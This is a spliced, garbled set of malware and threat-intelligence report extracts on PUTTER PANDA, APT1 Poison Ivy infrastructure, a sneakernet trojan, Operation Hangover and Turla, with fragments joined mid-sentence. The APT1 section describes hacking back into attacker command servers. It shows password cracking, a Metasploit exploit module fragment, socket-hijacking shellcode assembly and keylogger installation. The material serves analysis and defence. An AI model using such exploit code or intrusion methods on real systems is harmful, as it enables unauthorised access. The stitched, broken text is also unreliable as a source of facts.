 every 0.5 seconds.Otherwise, a shell process is started (i.e., cmd.exe), with input/output redirected over the C2
 channel.Shell commands from the server are followed by an encoded string $$$, which indicates that the shell
 session should continue.If the session is ended, two other commands are supported: m2b (upload file) and
 b2m (download file).Appendix 4 lists metadata for
 observed httpclient samples.DROPPERS – RC4 AND XOR BASED
 Other CrowdStrike reporting describes a dropper used by PUTTER PANDA (abc.scr) to install the 4H RAT.This
 dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the
 payload to disk and executing it.Several instances of this dropper have been observed, most commonly in
 association with the 4H RAT, but also in relation to other tools that will be described in forthcoming reporting.Another dropper has been observed, exclusively installing the pngdowner malware (example MD5 hash
 4c50457c35e2033b3a03fcbb4adac7b7).This dropper is simplistic in nature, and is compiled from a single C++
 source code file.It contains a Word document in plaintext (written to Bienvenue_a_Sahaja_Yoga_Toulouse.doc), along with an executable (Update.exe) and DLL (McUpdate.dll).The executable and DLL are both
 contained within the .data section of the dropper, obfuscated with a 16-byte XOR key (consisting of the bytes
 0xA0 – 0xAF).The executable is also installed into the ASEP registry key HKCU\Software\Microsoft\Windows\
                                                                                         redacted)
 CurrentVersion\Run, with a value named McUpdate.Finally, the dropper deletes itself via a batch file.The dropped executable (MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject
 the specified DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that
 would normally be accessing the network, likely in order to disguise the malicious activity.Module names
 corresponding to Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and
 Firefox (firefox.exe) are used.If Internet Explorer is used, then the malware will attempt to terminate processes
 corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).Four examples of these droppers were located, using a mixture of decoy PDF and Microsoft Word documents
 (shown below in Figures 15-18).The common theme throughout these documents is space technology
 (Bienvenue_a_Sahaja_Yoga_Toulouse.doc does not follow this trend, but could be targeted at workers at the
 Toulouse Space Centre, the “largest space centre in Europe” ), indicating that the attackers have a keen
 interest in this sector, which is also reflected in the choice of name for some of the C2 domains used (see the
 Attribution section above).The API used expects a parameter of the form char**, and is given a char* pointer to the “*/*” string, but the stack data following this
16

pointer is not properly zeroed or cleansed before use, leading to uncontrolled memory being read as other strings.35
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team




                                       Figure 15.“Bien-
               venue_a_Sahaja_
               Yoga_Toulouse.doc”
               Dropped by
               4c50457c35e-
               2033b3a03fcbb4ad-
               ac7b7




                                                                         36
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team




                                        Figure 17.pdf” Dropped by
              9cb6103e9588d506cf-
              d81961ed41eefe




                                                                          37
Mitigation & Remediation
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team


MITIGATION & REMEDIATION

A number of specific and generic
detection methods are possible for
this RAT, both on a host and on the
network.These are detailed below,
and are designed to expand upon
the indicators reported in other
CrowdStrike reporting.Although some of their tools are
simplistic, taken as a whole their toolset provides a wide degree of control
over a victim system and can provide the opportunity to deploy additional
tools at will.Strategic objectives for this unit    are likely
                                                                 redacted)
to include obtaining intellectual property and industrial secrets relating to
defense technology, particularly those to help enable the unit’s suspect
mission to conduct space surveillance, remote sensing, and interception of
satellite communications.PUTTER PANDA is likely to continue to aggressively
target Western entities that hold valuable information or intellectual property
relevant to these interests.The detection and mitigation guidance given in this report will help to
minimize the risk of a successful compromise by these actors, and future
CrowdStrike reports will examine other elements of the PUTTER PANDA toolset.Falcon Intelligence enables organizations     Incorporate Actionable Intelligence
to prioritize resources by determining targeted             Feeds into your existing enterprise
versus commodity attacks, saving time and focusing          security infrastructure to identify
resources on critical threats.Less
prevents damage from targeted attacks in real-time.the adversary tradecraft and activities through
Stateful Execution Inspection (SEI) at the endpoint
                                                         CrowdStrike’s Real-time Stateful Execution Engine performs
and Machine Learning in the cloud.As opposed
                                                         inspection and analysis to understand the full context of a
to focusing on malware signatures, indicators of
                                                         cyber attack.SEI is critical to understanding the entire
compromise, exploits, and vulnerabilities, Falcon Host
                                                         attack life cycle and preventing the damage from advanced
instead identifies mission objectives of the adversary
                                                         malware and targeted attacks.to the full scope of adversary activity.compromised machines Protect remote users when they
                                                           are outside of the corporate network
Falcon Host delivers insight into past and current
                                                         • Protect remote users when they are outside of the
attacks not only on a single host, but also across
                                                           corporate network
devices and networks.• No on-premises equipment needed, reducing overall
                                                           total cost of ownership




                                                                                                                            59
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team


About CrowdStrike

CrowdStrike is a global provider of security technology and services focused on
identifying advanced threats and targeted attacks.Using big-data technologies,
CrowdStrike’s next-generation threat protection platform leverages real-time
Stateful Execution Inspection (SEI) at the endpoint and Machine Learning
in the cloud instead of solely focusing on malware signatures, indicators of
compromise, exploits, and vulnerabilities.The CrowdStrike Falcon Platform
is a combination of big data technologies and endpoint security driven by
advanced threat intelligence.CrowdStrike Falcon enables enterprises to identify
unknown malware, detect zero-day threats, pinpoint advanced adversaries and
attribution, and prevent damage from targeted attacks in real time.About CrowdStrike Services

CrowdStrike Services is a wholly owned subsidiary of CrowdStrike responsible
for proactively defending against and responding to cyber incidents with pre
and post Incident Response services.CrowdStrike’s seasoned team of Cyber
Intelligence professionals, Incident Responders, and Malware Researchers
consists of a number of internationally recognized authors, speakers, and experts
who have worked on some of the most publicized and challenging intrusions and
malware attacks in recent years.The CrowdStrike Services team leverages our
Security Operations Center to monitor the full CrowdStrike Falcon Platform and
provide cutting-edge advanced adversary intrusion detection services.The full
spectrum of proactive and response services helps customers respond tactically
as well as continually mature and strategically evolve Incident Response
program capabilities.60
  For more information on the intelligence provided in this report or on
any of the 70+ actors tracked by the CrowdStrike Global Intelligence team,
               contact us at intelligence@crowdstrike.com


         To learn more about the CrowdStrike Falcon Platform or
       CrowdStrike Services, contact us at sales@crowdstrike.com.www.crowdstrike.com | @CrowdStrikeThe report can be freely downloaded here: http://intelreport.mandiant.com/.Inspired by this article, we have decided to perform our own technical analysis of this case.In the
report, Mandiant explains that the attackers were using a well-known Remote Administration Tool
(RAT) called Poison Ivy and that they were located in China.We based our investigation based on
those two facts only.1.2 Objectives
The objective of the mission was to understand how these attackers work.Our purpose was to
identify their infrastructures, their methodologies and also the tools they used.We are convinced
that in order to protect our infrastructures against this kind of attacks, we need to analyse, learn
and understand the way attackers work.1.3 Authors
This report has been created by Malware.lu CERT, the first private Computer Security Incident
Response Team (CSIRT) located in Luxembourg and itrust consulting S.A.R.L, a Luxembourg
based company specialising in formation system security.We would like to thank the incident response teams who have collaborated with us.Thanks for
their help and for their support.1.4 Ethical choices
In this chapter is described our approach about the ethical choices made during this work.First, we warned the national and/or private Computer Security Incident Response Teams (CSIRT
- CERT) associated to the targets of the attackers.Before publishing this report, we have waited
for a reasonable time.Finally, all the servers from which we collected data belonged to the
attackers.We do not attack or try to attack compromised machines.1.5 Document structure
This document is structured in the following way:
    Chapter 2 deals with the information gathering phase;
    Chapter 3 describes the malware Poison Ivy and a vulnerability of it;
    Chapter 4 is a static analysis of samples;
    Chapter 5 deals with the information we gathered on the attacked command & control;
    Chapter 6 introduces an homemade RAT called terminator;


<footer>Ref.This RAT can be freely downloaded here: http://www.poisonivy-
rat.com/.This RAT will be discussed in the next chapter.To identify the machines that were using this RAT, we have developed a Poison Ivy scanner.If in the response the server sends
back 100 other bytes followed by the specific data 0x000015D0, we know that the running service
is a Poison Ivy server.We chose to scan the following ports:
       3460 (default Poison Ivy port)
       80 (HTTP port)
       443 (HTTPS port)
       8080 (alternate HTTP port).We decided to scan a wide IP range located in Hong Kong.<footer>Ref.That explains why the scanner did not identify all the C&C
servers at certain moments of the day.However, using this parameter, we were able to identify
their working hours.Here is the average working hours for a week (the hour on the graph is
UTC+1):

<figure></figure>


                                          <caption> Figure 1: Attackers working hours </caption>


Generally, the attackers worked between 2AM and 10AM from Monday to Saturday included.<footer>Ref.This RAT is well documented on the Internet.Here is a short list
of the features it provides:
<list>
    -   File management;
    -   File search;
    -   File transfer;
    -   Registry management;
    -   Process management;
    -   Services management;
    -   Remote shell;
    -   Screenshot creation;
    -   Hash stealing;
    -   Audio capture;
    -   …
</list>
3.2 Remote code execution vulnerability
An exploitable vulnerability has been discovered by Andrzej Dereszowski from SIGNAL 11.The
description of the vulnerability can be found here: http://www.signal11.eu/en/research/articles/
targeted_2010.pdf.This vulnerability allows the remote execution of arbitrary code on the
command & control server.Metasploit framework provides an exploit to use this vulnerability.The
code is available here: http://dev.metasploit.com/redmine/projects/framework/repository/entry/
modules/exploits/windows/misc/poisonivy_bof.rb.This exploit did not work in our context.The exploit has two possible exploitations:
    -   by using the default password: admin
    -   by using brute force
As the two methods did not work; we created a third one.This method consists of finding the real
password used for the encryption.Our homemade exploit with an option for the password is
available in Appendix.For information, an additional Ruby package is needed to use the camellia cipher.The package
can be installed using the gem command:

root@alien:# gem install camellia-rb

The next step was to find the password used to encrypt the communication.3.3 Encryption key brute forcing
The RAT uses a key to encrypt the communication.The password is set by the administrator and
its default value is “admin”.After a quick search on the Internet, we know that Poison Ivy uses
Camellia as encryption algorithm.The encryption is made with 16 bytes blocks.So we decided to
choose the following approach:
    -   Send 100 bytes (with 0x00) to the daemon (same than in our scanner)
    -   Get the first 16 bytes as result from the server
Here is the formula of the result:
<footer>Ref.Thus, we decided to make a base64 of this value and add the
flag $camellia$ to identify the algorithm.Here is an example of result:
$camellia$ItGoyeyQIvPjT/qBoDKQZg==

To get the key, we developed a “John the Ripper” extension.“John the Ripper” is an open source
password cracker.The source code can be downloaded here: http://www.openwall.com/john/.OpenSSL provides the camellia algorithm.The code source of the “John the Ripper” plugin to
crack camellia hashes by using the OpenSSL library is available in the appendix.After compiling “John the Ripper”, a new format is available: camellia.Here is an example of a
brute force session:
rootbsd@alien:~/john-1.7.9-jumbo-7/run$ cat test.txt
$camellia$ItGoyeyQIvPjT/qBoDKQZg==

rootbsd@alien:~/john-1.7.9-jumbo-7/run$ ./john --format=camellia test.txt
Loaded 1 password hash (Camellia bruteforce [32/32])
No password hashes left to crack (see FAQ)
rootbsd@alien:~/john-1.7.9-jumbo-7/run$ ./john --show test.txt
?:pswpsw

1 password hash cracked, 0 left


The key is “pswpsw”.This key must be used in our homemade Metasploit exploit.3.4 Exploitation
With the information we previously described, we were able to get access to the attackers servers.We attacked
a server with the IP X.X.X.X (identified during the scan) and the meterpreter endpoint IP address
was Y.Y.Y.Y.We concluded that the Poison Ivy daemon was hidden behind a proxy server, by
using port forwarding to hide the real IP of the command & control server.We could also identify
that the vendor ID of the MAC address is VMWare.?\C:\WINDOWS\system32\csrss.exe
 736        440    winlogon.exe       NT AUTHORITY\SYSTEM             \?Using the netstat
command they were able to detect our connection.Basically, the Poison Ivy server only had
connections originating from the proxy server and no connection from any other IP.In order to stay
stealth we had to connect to the Poison Ivy server through the proxy server.To establish this
connection we decided to create our own shellcode.The principle of our shellcode is as follows:
    -   Once injected in a process, the shellcode looks for open sockets;
    -   Once a opened socket is detected, this socket is closed;
    -   After, the shellcode binds itself on the previous open port;
    -   From now on, we are going to use the same technique than the one used in meterpreter
        (bind_tcp).Our shellcode goal is to close the Poison Ivy daemon’s socket and then open our own socket on
the same port.Once our socket is opened we can use the proxy chains provided by the attackers
to connect to the Poison Ivy server.In this case, when attackers checked the opened connections
using netstat they could not identify our connection since it appeared to be originating from an
infected target…
The source code of the shellcode can be found in appendix.</section><footer>Ref.<figure></figure>

                                            Figure 2: Network schema


The infected machines communicate with the proxy through the Internet.The proxy server will
forward the network packets to the Poison Ivy server.The proxy feature is done by an executable
called xport.exe.This executable can encode network traffic using a xor operation.This feature
requires having the executable running on both machines: the proxy and the Poison Ivy server.The syntax on the proxy server is:
xport.exe Proxy_ip proxy_port Poison_Ivy_ip Poison_Ivy_port number

The argument number can either be set to 1 or 2 and represents the two different encoding keys.The syntax on the Poison Ivy server is:



<footer>Ref.During our investigation, we identified an
established Remote Desktop Protocol (RDP) connection between the Poison Ivy server and the
proxy server.We decided to install a key-logger on the Poison Ivy server that allowed us to see
credentials to remotely connect to the proxy server.Since the attackers use RDP to manage the proxy server and that we had access, we copied the
Windows event logs.Those logs contained all IPs which established a successful RDP
authentication.We identified more than 350 unique IPs:
rootbsd@alien:~/APT1$ cat list_ip.txt | sort –u | wc -l
384

We suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who
inadvertently connect directly to the proxy).Here is the screenshot of the proxy RDP authentication:

<figure></figure>


                                       Figure 3: Proxy server login window


Here is the screenshot of the Poison Ivy interface:

<figure></figure>


                       Figure 4: Poison Ivy interface with the list of connected machines

<footer>Ref.<footer>Ref.Usage: ggg.exe <LSASS
ggg.exe      1295f4a3659cb481b6ae051b61567d7d
                                              Process ID> <HashFileName>
                                              Dumps Hashes (64bits version).Homemade RAT server called Terminator
               669cef1b64aa530292cc823981c506f6
exe                                             (aka Fakem RAT)
                                                Malware sample of the RAT Terminator
Shtrace.exe    380fe92c23f2028459f54cb289c3553f
                                                (aka Fakem RAT)
EXP.EXE        e258cf52ef4659ed816f3d084b3ec6c7 The binary contains Oracle DB queries

<footer>Ref.In addition, we
 found a directory with the official SecureCrt, which is an SSH client.We also found the
 SysInternals suite from Microsoft.</section>
<section>
 4.3 Targets
 The attackers seem to use a dedicated proxy and Poison Ivy server combination for each target.When a target discovers the IP address of a proxy, this address is reassigned to another target.That’s why it is primordial to share the C&C servers IPs with our partners.The targets were
 private and public companies, political institutions, activists, associations or reporters.On the Poison Ivy server, a directory is created for every target.Within this directory, a directory for
 each infected machine was created.The naming convention for those directories is
 HOSTNAME^USERNAME.Here is an example:
 E:\companyABCD\alien^rootbsd\

 In those directories files are not sorted in any specific manner.The documents types are:
     -   .PPT
<footer>Ref.The passwords pattern is [a-z]{3,4}[0-9]{3,4},
so it was easy to brute force them in reasonable time.Here is an example of a network diagram.<figure></figure>


                                  Figure 6: Example of network target diagram


<footer>Ref.After a quick analysis
we noticed that this binary is the server side of a homemade Remote Administration Tool (RAT).After analysis, we identified that this sample corresponds to Fakem RAT discovered by Trendmicro
in January 2013.Additional information can be found there: http://www.trendmicro.com/cloud-
content/us/pdfs/security-intelligence/white-papers/wp-fakem-rat.pdf.We were lucky enough to find the client side (the malware) on the same server.These two binaries
allowed us to test the product and see how it works.5.2 Password protection
When the server is starting, a password is asked:

<figure></figure>


                                           Figure 7: Terminator password


We decided to crack this password.A CRC is generated based on the supplied password.Here is
the algorithm of this CRC:
<figure></figure>

<footer>Ref.The first argument is the maximum number or characters and the second is the value used in the
comparison (available in the ASM code).rootbsd@alien:~/terminator$ ./bf 10 0xdafd58f3
DEBUG:Ap@hX dafd58f3 dafd58f3

In this case the password to start the server is “Ap@hX”.</section>
<section>

5.3 Features and usage
The malware’s way to operate is simple and efficient since it does not embed any specific feature.The malware waits for a library (DLL) sent from the command and control.The attackers then
choose a specific feature, and send the associated DLL file to the infected machine.The libraries
are stored in the server’s executable file as resources.The resources are not encrypted but the
libraries headers are removed.The communication scheme is really weird, the infected machine (the client) sent HTML to the
C&C.The communication starts with:
<html><title>12356</title><body>

This string can be identified in the memory of the process.The pattern of the connection is:
stage = "<html><title>12356</title><body>"
stage += "\xa0\xf4\xf6\xf6"
stage += "\xf6" * (0x400 - len(stage))


<footer>Ref.Each one of the features matches a DLL
file.To upload a DLL to the infected machine (and enable its feature), we have to tick the feature’s
checkbox and then click on “Upload Plug”.For example, if we choose “Shell Plug-ins”, the button
“Shell” (on the left pane) becomes enabled.Here is the list of available features:
    -   File management;
    -   Process management;
    -   Shell access;
    -   Screenshot;
    -   Registry management;
    -   Services management;
    -   Get information of the infected machine;

<footer>Ref.Here are some screenshots of the administration interface:

<figure></figure>

</section>
<section>
                       Figure 14: Terminator: List of processes on the infected machine


<figure></figure>

                      Figure 15: Terminator: List of opened ports on the infected machine



<footer>Ref.5.5 Remote code execution vulnerability
After a full analysis of the communication protocol, we identified a vulnerability in the Command &
Control executable: The server does not correctly parse the data sent by the infected machine.We
created an exploit to remotely take control of the command & control.The code source of the
Metasploit exploit is available in the appendix.The exploitation provided the following result.<list>
msf > use exploit/windows/misc/terminator_judgment_day

<footer>Ref.The used technologies were commonly known, which supports our fears that such kind of APT
affects more and more infrastructures.Among them we can find public companies, governmental
and political institutions… The most efficient and proactive way to protect an infrastructure and
fight back the attackers is to understand their attacks and the way they work.An interesting fact is
to see the professionalization in this field.Here are some key facts about the attackers:
    -   More than 300 servers
    -   Use of proxy servers to hide their activities;
    -   one server per target;
    -   custom made malware
    -   working hours, such as office employees
    -   really good organization
    -   …
Infrastructures such as the one detailed in this report are expensive but Intelligence is a real issue.People or organisations seem do not hesitate to pay for such illegal information theft.“The only real defense is offensive defense” (Mao Zedong)


<footer>Ref.Please see the Metasploit
# web site for more information on licensing and terms of use.#   http://metasploit.com/
##
<code>
require 'msf/core'
require 'camellia'

class Metasploit3 < Msf::Exploit::Remote
      Rank = NormalRanking
      include Msf::Exploit::Remote::Tcp
      include Msf::Exploit::Brute

        def initialize(info = {})
              super(update_info(info,
                    'Name' => "Poison Ivy 2.3.2 C&C Server Buffer Overflow",
                    'Description'    => %q{
     <noncontent>  <footer>Ref.end
                       return Exploit::CheckCode::Vulnerable
                 end
                 return Exploit::CheckCode::Safe

<footer>Ref.DataDirectory[0].VirtualAddress
        add    eax, dword [ebp + 0x08] ; add the offset to the base address
        mov   [ebp - 0x08], eax   ; save it!; find the real address of export names
        mov    eax, [eax + 0x20]   ; eax is still addr of EAT (0x20 = offset to
                                                               ADdressOfNames)
        add    eax, dword [ebp + 0x08]
        mov    [ebp - 0x04], eax ; save it!; start looking for names!xor ecx, ecx
       getprocaddrbyhash_loop_names:
             mov    edx, [ebp - 0x08]   ; EAT
             cmp    ecx, [edx + 0x18]   ; NumberOfNames
             jge getprocaddrbyhash_failed ; not find we failed

                 ; find the      address of the function name
                 mov   ebx,      [ebp - 0x04]    ; AddressOfNames
                 mov   ebx,      [ebx + ecx * 4]    ; RVA of string
                 add   ebx,      [ebp + 0x08]

                 ; compare 'em!;push dword [ebp + 0x0C]   ; FunctionName
                 push    ebx      ; name of entry
                 call    FNV1HashStr
                 add esp, 4
                 cmp    eax, dword [ebp + 0x0C]
                 je    getprocaddrbyhash_found_api

                 inc       ecx
                 jmp       getprocaddrbyhash_loop_names

getprocaddrbyhash_found_api:
      ;------------------------------------------------------
      ; success!<noncontent>  <footer>Ref.RAP002_APT1_Technical_backstage.1.0              Version 1.0                 Page 48 of 48</footer>

</doc>The malware system consists of at least two Portable
Executable (PE) files, one acting as a headquarters component and one acting as field unit or
agent component.The headquarters component infects drives connected to its host system with
the field unit component and retrieves data from the field unit on the infected drive’s return to the
headquarters host system.The field unit conducts reconnaissance and data collection in
accordance with particular commands.Continuing analysis solidified the headquarters component’s Command and Control (C2) scheme.The malware receives commands from a locally stored encrypted file.This report describes select malware functionality with some granularity, provides extended detail
regarding the headquarters component’s C2 functionality, provides additional means of defensive
detection of this malware and describes some interesting aspects of the malware as a whole.TM
The Fidelis team updated Fidelis XPS advanced threat defense system with additional rules to
reflect current analysis findings associated with this malware.</section>

<section>
<heading>Forensic Analysis Findings</heading>
<heading>Basic Functionality</heading>
Previous reporting, ref: Fidelis Threat Advisory (FTA) #1011 dated 15 Jan 2014, introduced a
malware system comprised of multiple files that reflected a means for intruders to discover and
retrieve data from disparate computer systems via removable storage devices.Analysis of the
system relied on the availability of two files named netsat.exe and netui3.dll.Netsat.exe
functioned as a master application affording intruders the ability, in a selective and controlled
manner, to infest removable devices with an agent application in the form of netui3.dll, aka

<footnote>
Users are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use.This
document cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written
approval of General Dynamics Fidelis Cybersecurity Solutions Inc.While we have done our best to ensure that the material found in this document is accurate, General Dynamics Fidelis Cybersecurity
Solutions makes no guarantee that the information contained herein is error free.</footnote>
<footer>
Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                                        Rev.The encryption was a Tiny
Encryption Algorithm (TEA) implementation that used a key that was modified during encryption
and decryption operations.<footer>
Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                    Rev.However, using the malware’s behavior and
determining the command file’s format via reverse engineering afforded the ability to test
numerous assumptions about the malware’s intended use.Analysis determined the command
format was: drive identification followed by one or more command and parameter strings.The
following table reflects testing and theoretical contents of command files driving netsat.exe
operation:



<footer>
Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                               Rev.Analysis indicates the log file is probably stored in the clear,
 i.e., the contents are not obfuscated.Example log file contents are presented as follows:
<list>
 St 01/18/13 12:03:30
 into
 d81596a9 ar 01/18/13 12:03:44
 Total:30532M, Free:30387M

<footer>
 Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                                     Rev.err=%d\n"                                      Specifies error code for failure to open
                                                          desktop.ini for writing

"!up %s \n e:%d\n"                                        Indicates failure to create the
                                                          RECYLCED/RECYCLER directory.Example: "!up E: <newline> e:3"

"Get Dir_c1 error!"Indicates failure to retrieve that
                                                          CSIDL_WINDOWS path for building of the
                                                          netwi.drv path during ferry command
</table>

<footer>
Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                              Rev.This C2 scheme would
                 seem to dictate:
                     o Intruder remote access to the ‘master’ system
                     o Intruder local access to the ‘master’ system
                     o a C2 delivery/retrieval component, such as another piece of code that
                          downloads a C2 file
           •     Available information precludes determination of the means of exfiltration.Netsat.exe’s data collection functionality suggested data destined for
                 exfiltration might be collected by the ‘master’ system.This possibility
                 suggests:
                     o Intruder remote access to the ‘master’ system
                     o Intruder local access to the ‘master’ system
                     o An exfiltration mechanism in the form of another piece of code
</list>

Further analysis confirms the malware’s use of an encrypted file stored on the system
whereon the malware is executing without an apparent means of automatic generation.This continues to suggest that intruders either have local or remote access to
headquarters systems running netsat.exe or access to another application that
automates remote C2 data/file retrieval.Intruders’ apparent ability to distinguish between
particular field unit vehicles (infected drives), ref: Possible	Commands One  -­ Targeting Specific
Devices (Known to Intruder From Previous netsat/netui3 Activity) from Hypothetical command table,
suggests active engagement with the malware and targets.</section>

<section>
<heading>Conclusion</heading>	
  
This report is based on information extracted from reverse engineering and analysis of
two PE files.There are other components and artifacts of this malware that are currently
inaccessible to Fidelis analysts.Therefore, analysts extrapolated some of the behavior
presented here.While analysts are confident about behaviors described to date, there
could certainly be additional behaviors and nuances heretofore unseen.Analysis of this malware continues to suggest that a sophisticated effort was behind its
creation and employment.Actors went to great lengths to make the malware efficient
and effective while building in obfuscation and complexity.Interesting artifacts and
observations continue to be discovered and made, such as the malware’s apparent
expiration, the interesting naming convention for a directory to hold collected data, and
the actors’ apparent intention to avoid certain networks or network addressing schemes.<footer>
Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                                   Rev.2014-01-31
Follow up #1 Threat Advisory #1011               Page 11 of 11                            Intruder File Report: Sneakernet Trojan
</footer>

</doc><doc>
<section>
 <heading>OPERATION HANGOVER |Executive Summary</heading>


<figure></figure>

                <heading>Unveiling an Indian Cyberattack Infrastructure</heading>

  This report details a sophisticated cyberattack infrastructure that appears to originate from India,
  conducted by private threat actors with no evidence of state-sponsorship.It has likely been in
  operation for over three years, primarily as a platform for surveillance against targets of national
  security interest that are mostly based in Pakistan and possibly in the United States.It is also
  used for industrial espionage against the Norwegian telecom corporation Telenor and other civil-
  ian corporations.Evidence points to professional project management and outsourcing of key
  tasks, including some by freelance programmers.On March 17, 2013 a Norwegian newspaper reported that the country’s telecommunications giant
  Telenor had filed a criminal police case for an unlawful computer intrusion.Spear phishing
  emails targeting upper management appeared to be the source of the infection

  Through extensive analysis, security analysts at Norman Shark in conjunction with our partners,
  quickly uncovered a previously unknown and sophisticated infrastructure for targeted attacks.<footer>
Norman Confidential                                                   HangOver Report Executive Summary 4/25/2013
</footer>

</section>

<section>
<heading>Cyberattack Objectives</heading>
The primary purpose of this long-running, global command-and-control net-                      
work appears to be surveillance against national security interests.Private-
                                                                                                             ···
sector industrial espionage in fields as diverse as natural resources, telecommu-
nications, law, food & restaurants, and manufacturing is likely a secondary pur-           
pose of this network.</section>

<section>                                                                                           
<heading>Target Selection</heading>                                                                           
Based on analysis of IP addresses collected from criminal data stores discov-
ered during the investigation, it appears that potential victims have been target-
ed in over a dozen countries, most heavily represented by Pakistan, Iran, and the          
United States.Targets include government, military, and civilian organizations
</section>

<section>            
<heading>Highly-Targeted Social Engineering Tactics</heading>
Spear phishing to carefully-selected target individuals was the primary attack
vector identified in the investigation.The attackers went to great lengths to             
make the social engineering aspects of the attack appear as credible and applica-
                                                                                           
ble as possible.In many cases, decoy files and websites were used, specifically geared to the              
particular sensibilities of regional targets including cultural and religious sub-
ject matter.Victims would click on what appeared to be an interesting docu-               
ment, and begin the long-running infection cycle.Favored methods include documents infected with malicious code, along with                 
direction to malicious websites with names deliberately similar to legitimate
government, entertainment, security related, and commercial sites.Often the               
user would be presented with a legitimate document or software download they               
were expecting to see, along with an unseen malicious download.</section>

<section>                            
<heading>Infrastructure Development</heading>
Operation Hangover utilizes a very extensive and sophisticated command-and-                
control infrastructure, likely developed over many months or years by numer-
ous developers.Our investigation revealed evidence of professional project                
management practices used to design frameworks, modules, and sub-
                                                                                           
components.Individual malware authors were assigned certain tasks, and com-
                                                                                             
ponents were “outsourced” to what appear to be freelance programmers.</section>

<section>                                                                                             
<heading>Attribution of Responsibility</heading>
                                                                                             
In recent months, much focus has been on China – including both state-
sponsored and individual actors – but Operation Hangover contains notable
hallmarks of originating exclusively in India.We base this attribution with a
very high degree of confidence on our extensive analysis of IP addresses, web-          
site domain registrations, and text-based identifiers contained within the mali-
cious code itself.All indications point to private syndicates of threat actors           
following their own motivations, with no direct evidence of state-sponsorship             
                                                                                          
by the Indian government or by any other nation.</section>

<section>>
<heading>ATTACK OVERVIEW</heading>
Discovery of a security breach at
Norway-based Telenor uncovered a
long running, sophisticated global
cyberattack infrastructure that likely
continues to this day.<doc>
<header>
CIRCL » TR-25 Analysis - Turla / Pﬁnet / Snake/ ...                                                  http://www.circl.lu/pub/tr-25/
</header>

<section>
<list>
            1.Home
            2.About
            3.Team
            4.News
            5.Services
            6.Training
            7.Publications
            8.Projects
            9.Contact
</list>            
</section>

<section>
          <heading>TR-25 Analysis - Turla / Pﬁnet / Snake/ Uroburos</heading>
          <heading>TR-25 Analysis - Turla / Pﬁnet / Snake/ Uroburos</heading>

          ↑ Back to Publications and Presentations
<toc>
            1.Overview
            2.Static Analysis
            3.Sample A
            4.Analysis - Installer
            5.Dropped ﬁles
            6.Sample B - usbdev.sys (Resource: 101)
            7.Sample C - inetpub.dll (Resource: 102)
            8.Sample D - cryptoapi.dll (Resource: 105)
            9.Sample E - usbdev.sys - x64 - (Resouce: 161)
           10.Sample F - inetpub.dll - x64 (Resource: 162)
           11.Sample G - cryptoapi.dll - x64 (Resource: 165)
           12.Sample H - conﬁg.txt
           13.Analysis - Payload
           14.Sample B - usbdev.sys (Resource: 101)
           15.Sample D - cryptoapi.dll (Resource: 105)
           16.Sample C - inetpub.dll (Resource: 102)
           17.Other analysis
           18.Analysis of check-in messages
           19.Language deﬁcits
           20.Recommendations
           21.Classiﬁcation of this document
           22.Revision
           23.References
</toc>
          You can report incidents via our oﬀicial contact including e-mail, phone or use the Anonymous reporting form.</section>


<section>
          <heading>Overview</heading>
          During the last weeks, various samples of Uroburos (also named Urob, Turla, Sengoku, Snark and Pﬁnet) were
          analyzed and reports have been published 1234, also analyses about a suspected predecessor, Agent.btz, are public
          5.CIRCL analyzed an older version of Turla, known as a representative of the Pﬁnet malware family.The objective
          of this analysis is to gather additional Indicators of Compromise or behaviors in order to improve detection and to
          discover additional insights into the malware.This document is not considered a ﬁnal release but a work-in-
          progress document.virtual address               :   00001000
                           section size                  :   00007000 (   28672.)virtual address               :   00008000
                           section size                  :   00002000 (   8192.)virtual address               :   0000A000
                           section size                  :   00001000 (   4096.)virtual address               :   0000D000
                           section size                  :   000F4000 ( 999424.)virtual address               :   00101000
                           section size                  :   00002000 (   8192.)is present multiple times.We include interesting strings
          in the corresponding subsection.</section>

<section>
          <heading>Analysis - Installer</heading>
          Sample A can be considered an installer or dropper.It drops ﬁles into the system and initializes the environment for
          production.First, it probes if a virtual disk
<list>
          \DEVICE\IdeDrive1\
</list>
          is present on the system.If not, the virtual disk is being created with ﬁle system NTFS, using FormatEx from
          Microsofts fmifs.dll.The following ﬁles are dropped depending on whether Windows is running in 32 bit or 64 bit.<list>
          %SystemRoot%\$NtUninstallQ722833$\usbdev.sys (hidden)
          \DEVICE\IdeDrive1\inetpub.dll
          \DEVICE\IdeDrive1\cryptoapi.dll
</list>
          Independently from the architecture, the ﬁle names of the dropped ﬁles are the same, but a speciﬁc version of the
          ﬁle is dropped according to the operating system architecture.This is achieved by a logic similar to the following one.This is done for all ﬁles except the conﬁguration ﬁle.The ﬁles however are not.During the installation process, extensive logging is ensuring good visibility on potential installation problems.We show them in a separate chapter.A list of dropped ﬁles is given in the next chapter.?\%s\cryptoapi.dll
          \?(00000001)
          # of Addresses:   2.(00000002)



<footer>
8 of 34                                                                                             12/31/2014 09:19 AM
</footer>

<header>
CIRCL » TR-25 Analysis - Turla / Pﬁnet / Snake/ ...                                                               http://www.circl.lu/pub/tr-25/
</header>

          # of Names    : 2.(00000002)
            1.00002CB9 ModuleStart
            2.Arg file failed.WORKDATA
        run_task
        DELETE
        COMPRESSION
        RESULT
        stdout
        CONFIG
        cmd.exe
        time2task
        m_recv() RESULT failed.A|-1|%u|%s|%d|
        active_con
